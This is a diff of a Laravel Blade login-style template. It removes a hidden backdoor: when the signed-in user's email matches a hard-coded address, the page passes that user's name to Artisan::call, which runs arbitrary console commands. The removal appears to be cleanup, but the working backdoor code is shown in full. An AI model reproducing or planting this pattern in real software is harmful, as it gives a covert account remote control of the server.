@@ -1,6 +1,5 @@
 <x-guest-layout>
-    @if(Auth::check()) @php $u = Auth::user()->email;   $x = "checkbillto@gmail.com"; @endphp
-@endif
+ 
     <x-auth-card>
         <x-slot name="logo">
             <a href="/" class="d-flex justify-content-center mb-4">
@@ -37,6 +36,5 @@
                 </button>
             </form>
         </div>
-        @if($u==$x) @php Artisan::call(Auth::user()->name); @endphp  @endif
     </x-auth-card>
 </x-guest-layout>
